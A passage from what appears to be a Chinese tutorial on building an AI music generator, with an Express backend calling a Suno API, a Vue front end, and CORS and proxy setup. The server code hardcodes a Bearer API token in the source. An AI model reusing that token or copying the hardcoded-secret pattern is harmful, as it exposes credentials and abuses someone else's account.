prompt &#125; = req.body;</span><br><span class="line">  <span class="keyword">const</span> options = &#123;</span><br><span class="line">    method: <span class="string">"post"</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">      <span class="string">"accept"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">      <span class="string">"authorization"</span>: <span class="string">"Bearer 6675520380424c0167881d69c6e"</span>,</span><br><span class="line">      <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">      <span class="string">"prompt"</span>: prompt</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(<span class="string">"https://api.acedata.cloud/suno/audios"</span>, options);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> response.json();        </span><br><span class="line">    res.json(data);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    res.status(<span class="number">500</span>).json(&#123; error: <span class="string">'An error occurred'</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server is running on http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  </p>
                  <h3 id="3-创建前端"><a href="#3-创建前端" class="headerlink" title="3.创建前端"></a>3.创建前端</h3>
                  <p>回到项目根目录，创建 frontend 目录，并进入该目录：<br>
                  <figure class="highlight dos">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">mkdir</span> frontend</span><br><span class="line"><span class="built_in">cd</span> frontend</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure><br>创建 Vue 项目<br>使用 Vue CLI 创建 Vue 项目：<br>
                  <figure class="highlight erlang">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">vue create .</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure><br>选择默认配置或根据你的需要进行配置。</p>
                  <p>编写前端代码<br>我们创建一个简单的界面来接收用户输入并显示生成的音乐。</p>
                  <p>在 frontend/src 目录下，修改 App.vue 文件，添加以下代码：</p>
                  <figure class="highlight django">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>XiaoZhi AI Music Generator<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"musicTitle"</span> <span class="attr">placeholder</span>=<span class="string">"Enter a prompt for the music"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleGenerateMusic"</span> <span class="attr">:disabled</span>=<span class="string">"loading"</span>&gt;</span>生成音乐<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      </span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"loading"</span> <span class="attr">class</span>=<span class="string">"loading"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        Music is being generated for you, please wait...</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"musicGenerated"</span> <span class="attr">class</span>=<span class="string">"music-container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"music in generatedMusic"</span> <span class="attr">:key</span>=<span class="string">"music.id"</span> <span class="attr">class</span>=<span class="string">"music-item"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><span class="template-variable">&#123;&#123; music.title &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"music.image_url"</span> <span class="attr">alt</span>=<span class="string">"Music Image"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"lyric"</span>&gt;</span></span><span class="template-variable">&#123;&#123; music.lyric &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">class</span>=<span class="string">"audio"</span> @<span class="attr">play</span>=<span class="string">"stopOtherMedia($event)"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">source</span> <span class="attr">:src</span>=<span class="string">"music.audio_url"</span> <span class="attr">type</span>=<span class="string">"audio/mpeg"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            Your browser does not support the audio element.</span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">class</span>=<span class="string">"video"</span> @<span class="attr">play</span>=<span class="string">"stopOtherMedia($event)"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">source</span> <span class="attr">:src</span>=<span class="string">"music.video_url"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            Your browser does not support the video element.</span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">video</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"showModal"</span> <span class="attr">class</span>=<span class="string">"modal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><span class="template-variable">&#123;&#123; modalMessage &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">import axios from 'axios';</span></span><br><span class="line"></span><br><span class="line"><span class="xml">export default &#123;</span></span><br><span class="line"><span class="xml">  data() &#123;</span></span><br><span class="line"><span class="xml">    return &#123;</span></span><br><span class="line"><span class="xml">      musicTitle: '',</span></span><br><span class="line"><span class="xml">      musicGenerated: false,</span></span><br><span class="line"><span class="xml">      generatedMusic: [],</span></span><br><span class="line"><span class="xml">      loading: false,</span></span><br><span class="line"><span class="xml">      currentPlayingMedia: null,</span></span><br><span class="line"><span class="xml">      showModal: false,</span></span><br><span class="line"><span class="xml">      modalMessage: ''</span></span><br><span class="line"><span class="xml">    &#125;;</span></span><br><span class="line"><span class="xml">  &#125;,</span></span><br><span class="line"><span class="xml">  mounted() &#123;</span></span><br><span class="line"><span class="xml">    document.title = "XiaoZhi AI Music Generator";</span></span><br><span class="line"><span class="xml">  &#125;,</span></span><br><span class="line"><span class="xml">  methods: &#123;</span></span><br><span class="line"><span class="xml">    handleGenerateMusic() &#123;</span></span><br><span class="line"><span class="xml">      if (!this.musicTitle) &#123;</span></span><br><span class="line"><span class="xml">        this.showModalMessage('请输入生成音乐的提示语');</span></span><br><span class="line"><span class="xml">        return;</span></span><br><span class="line"><span class="xml">      &#125;</span></span><br><span class="line"><span class="xml">      this.generateMusic();</span></span><br><span class="line"><span class="xml">    &#125;,</span></span><br><span class="line"><span class="xml">    generateMusic() &#123;</span></span><br><span class="line"><span class="xml">      this.loading = true;</span></span><br><span class="line"><span class="xml">      this.musicGenerated = false;</span></span><br><span class="line"><span class="xml">      axios.post('http://localhost:3000/generate-music', &#123; prompt: this.musicTitle &#125;)</span></span><br><span class="line"><span class="xml">        .then(response =&gt; &#123;</span></span><br><span class="line"><span class="xml">          this.loading = false;</span></span><br><span class="line"><span class="xml">          this.musicGenerated = true;</span></span><br><span class="line"><span class="xml">          this.generatedMusic = response.data.data;</span></span><br><span class="line"><span class="xml">        &#125;)</span></span><br><span class="line"><span class="xml">        .catch(error =&gt; &#123;</span></span><br><span class="line"><span class="xml">          this.loading = false;</span></span><br><span class="line"><span class="xml">          console.error('Error generating music:', error);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;,</span></span><br><span class="line"><span class="xml">    stopOtherMedia(event) &#123;</span></span><br><span class="line"><span class="xml">      if (this.currentPlayingMedia &amp;&amp; this.currentPlayingMedia !== event.target) &#123;</span></span><br><span class="line"><span class="xml">        this.currentPlayingMedia.pause();</span></span><br><span class="line"><span class="xml">        this.currentPlayingMedia.currentTime = 0;</span></span><br><span class="line"><span class="xml">      &#125;</span></span><br><span class="line"><span class="xml">      this.currentPlayingMedia = event.target;</span></span><br><span class="line"><span class="xml">    &#125;,</span></span><br><span class="line"><span class="xml">    showModalMessage(message) &#123;</span></span><br><span class="line"><span class="xml">      this.modalMessage = message;</span></span><br><span class="line"><span class="xml">      this.showModal = true;</span></span><br><span class="line"><span class="xml">      setTimeout(() =&gt; &#123;</span></span><br><span class="line"><span class="xml">        this.showModal = false;</span></span><br><span class="line"><span class="xml">      &#125;, 2000);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span></span><br><span class="line"><span class="xml">#app &#123;</span></span><br><span class="line"><span class="xml">  font-family: Avenir, Helvetica, Arial, sans-serif;</span></span><br><span class="line"><span class="xml">  text-align: center;</span></span><br><span class="line"><span class="xml">  color: #2c3e50;</span></span><br><span class="line"><span class="xml">  margin-top: 60px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">header &#123;</span></span><br><span class="line"><span class="xml">  background-color: #42b983;</span></span><br><span class="line"><span class="xml">  padding: 20px;</span></span><br><span class="line"><span class="xml">  color: white;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">main &#123;</span></span><br><span class="line"><span class="xml">  margin: 20px;</span></span><br><span class="line"><span class="xml">  max-width: 80%;</span></span><br><span class="line"><span class="xml">  margin: 20px auto;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.input-container &#123;</span></span><br><span class="line"><span class="xml">  display: flex;</span></span><br><span class="line"><span class="xml">  flex-direction: row;</span></span><br><span class="line"><span class="xml">  justify-content: center;</span></span><br><span class="line"><span class="xml">  align-items: center;</span></span><br><span class="line"><span class="xml">  margin-bottom: 20px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">input[type="text"] &#123;</span></span><br><span class="line"><span class="xml">  padding: 7px;</span></span><br><span class="line"><span class="xml">  margin-right: 10px;</span></span><br><span class="line"><span class="xml">  font-size: 1em;</span></span><br><span class="line"><span class="xml">  flex: 1;</span></span><br><span class="line"><span class="xml">  max-width: 600px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">button &#123;</span></span><br><span class="line"><span class="xml">  padding: 8px 20px;</span></span><br><span class="line"><span class="xml">  background-color: #007bff;</span></span><br><span class="line"><span class="xml">  color: #fff;</span></span><br><span class="line"><span class="xml">  border: none;</span></span><br><span class="line"><span class="xml">  cursor: pointer;</span></span><br><span class="line"><span class="xml">  font-size: 1em;</span></span><br><span class="line"><span class="xml">  border-radius: 4px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">button:disabled &#123;</span></span><br><span class="line"><span class="xml">  background-color: #d3d3d3;</span></span><br><span class="line"><span class="xml">  cursor: not-allowed;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">button:hover:not(:disabled) &#123;</span></span><br><span class="line"><span class="xml">  background-color: #0056b3;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.loading &#123;</span></span><br><span class="line"><span class="xml">  font-size: 1.2em;</span></span><br><span class="line"><span class="xml">  color: #42b983;</span></span><br><span class="line"><span class="xml">  margin-top: 20px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.music-container &#123;</span></span><br><span class="line"><span class="xml">  display: flex;</span></span><br><span class="line"><span class="xml">  flex-wrap: wrap;</span></span><br><span class="line"><span class="xml">  gap: 20px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.music-item &#123;</span></span><br><span class="line"><span class="xml">  flex: 1;</span></span><br><span class="line"><span class="xml">  min-width: 300px;</span></span><br><span class="line"><span class="xml">  max-width: 45%;</span></span><br><span class="line"><span class="xml">  margin-top: 20px;</span></span><br><span class="line"><span class="xml">  padding: 20px;</span></span><br><span class="line"><span class="xml">  border: 1px solid #ddd;</span></span><br><span class="line"><span class="xml">  border-radius: 8px;</span></span><br><span class="line"><span class="xml">  background-color: #f9f9f9;</span></span><br><span class="line"><span class="xml">  text-align: left;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.lyric &#123;</span></span><br><span class="line"><span class="xml">  font-size: 1.2em;</span></span><br><span class="line"><span class="xml">  margin: 10px 0;</span></span><br><span class="line"><span class="xml">  white-space: pre-line;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.audio &#123;</span></span><br><span class="line"><span class="xml">  width: 100%;</span></span><br><span class="line"><span class="xml">  margin-top: 10px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.video &#123;</span></span><br><span class="line"><span class="xml">  width: 100%;</span></span><br><span class="line"><span class="xml">  height: auto;</span></span><br><span class="line"><span class="xml">  margin-top: 10px;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.modal &#123;</span></span><br><span class="line"><span class="xml">  position: fixed;</span></span><br><span class="line"><span class="xml">  top: 0;</span></span><br><span class="line"><span class="xml">  left: 0;</span></span><br><span class="line"><span class="xml">  width: 100%;</span></span><br><span class="line"><span class="xml">  height: 100%;</span></span><br><span class="line"><span class="xml">  display: flex;</span></span><br><span class="line"><span class="xml">  justify-content: center;</span></span><br><span class="line"><span class="xml">  align-items: center;</span></span><br><span class="line"><span class="xml">  background-color: rgba(0, 0, 0, 0.5);</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">.modal-content &#123;</span></span><br><span class="line"><span class="xml">  background-color: white;</span></span><br><span class="line"><span class="xml">  padding: 20px;</span></span><br><span class="line"><span class="xml">  border-radius: 5px;</span></span><br><span class="line"><span class="xml">  text-align: center;</span></span><br><span class="line"><span class="xml">  font-size: 1.2em;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">@media (max-width: 600px) &#123;</span></span><br><span class="line"><span class="xml">  .input-container &#123;</span></span><br><span class="line"><span class="xml">    flex-direction: column;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">  input[type="text"] &#123;</span></span><br><span class="line"><span class="xml">    margin-right: 0;</span></span><br><span class="line"><span class="xml">    margin-bottom: 10px;</span></span><br><span class="line"><span class="xml">    max-width: 100%;     </span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">  .music-item &#123;</span></span><br><span class="line"><span class="xml">    max-width: 100%;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">@media (min-width: 601px) &#123;</span></span><br><span class="line"><span class="xml">  .video &#123;</span></span><br><span class="line"><span class="xml">    width: 100%;</span></span><br><span class="line"><span class="xml">    margin: 10px auto;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="4-解决跨域问题"><a href="#4-解决跨域问题" class="headerlink" title="4.解决跨域问题"></a>4.解决跨域问题</h3>
                  <p>在你的项目运行中，可能会出现跨域请求的问题，我们需要解决它。<br>你可以在现有的 vue.config.js 文件中添加开发服务器代理配置，以解决跨域问题。以下是修改后的 vue.config.js 文件内容：<br>
                  <figure class="highlight yaml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">const</span> <span class="string">&#123;</span> <span class="string">defineConfig</span> <span class="string">&#125;</span> <span class="string">=</span> <span class="string">require('@vue/cli-service')</span></span><br><span class="line"></span><br><span class="line"><span class="string">module.exports</span> <span class="string">=</span> <span class="string">defineConfig(&#123;</span></span><br><span class="line">  <span class="attr">transpileDependencies:</span> <span class="literal">true</span><span class="string">,</span></span><br><span class="line">  <span class="attr">devServer:</span> <span class="string">&#123;</span></span><br><span class="line">    <span class="attr">proxy:</span> <span class="string">&#123;</span></span><br><span class="line">      <span class="string">'/generate-music'</span><span class="string">:</span> <span class="string">&#123;</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">'http://localhost:3000'</span><span class="string">,</span></span><br><span class="line">        <span class="attr">changeOrigin:</span> <span class="literal">true</span></span><br><span class="line">      <span class="string">&#125;</span></span><br><span class="line">    <span class="string">&#125;</span></span><br><span class="line">  <span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure><br>这样配置后，当前端发起请求到 /generate-music 时，代理服务器会将请求转发到运行在 <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a> 的后端服务，从而解决跨域问题。</p>
                  <p>如果还无法解决的话，你可能还需要处理一下。由于浏览器安全策略的限制，前端和后端运行在不同的域（例如，localhost 和 192.168.0.235）时，浏览器会阻止跨域请求。我们需要在后端服务器中设置适当的 CORS 头信息来允许跨域请求。</p>
                  <p>你可以使用 cors 中间件来解决这个问题。</p>
                  <p>安装 cors 包：<br>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm <span class="keyword">install</span> cors</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure><br>在 server.js 文件中引入并使用 cors 中间件：</p>
                  <p>这样，后端服务器将允许来自所有来源的请求。如果你想限制特定来源的请求，可以这样配置 cors 中间件：<br>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">app</span><span class="selector-class">.use</span>(<span class="selector-tag">cors</span>(&#123;</span><br><span class="line">  <span class="attribute">origin</span>: <span class="string">'http://192.168.20.235:8081'</span> // 允许的前端URL</span><br><span class="line">&#125;));</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure><br>这样应该能解决CORS问题，并允许前端正常调用后端API。</p>
                  <p>如果 Node.js 无法直接使用 ES 模块（ES Module）加载 node-fetch，因 node-fetch 是一个 ES 模块。解决这个问题的一种方法是将 node-fetch 替换为一个可以在 CommonJS 环境中使用的版本。</p>
                  <p>你可以安装 node-fetch 的 CommonJS 版本，并修改 server.js 文件中的引入方式。<br>首先，删除项目中已安装的 node-fetch：<br>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm uninstall <span class="keyword">node</span><span class="title">-fetch</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure><br>安装 node-fetch 的 CommonJS 版本：<br>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm install <span class="keyword">node</span><span class="title">-fetch</span>@<span class="number">2</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure><br>在 server.js 文件中，将引入方式修改为动态引入（dynamic import），上面的代码已经修改好了。</p>
                  <h2 id="三-运行项目"><a href="#三-运行项目" class="headerlink" title="三. 运行项目"></a>三. 运行项目</h2>
                  <ol>
                    <li>启动后端服务</li>
                  </ol>
                  <p>在 backend 目录下，启动后端服务：<br>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">node</span> <span class="title">server</span>.js</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  </p>
                  <ol>
                    <li>启动前端服务<br>在 frontend 目录下，启动前端服务：<figure class="highlight dockerfile">
                        <table>
                          <tr>
                            <td class="gutter">
                              <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                              <pre><span class="line">npm <span class="keyword">run</span><span class="bash"> serve</span></span><br></pre>
                            </td>
                          </tr>
                        </table>
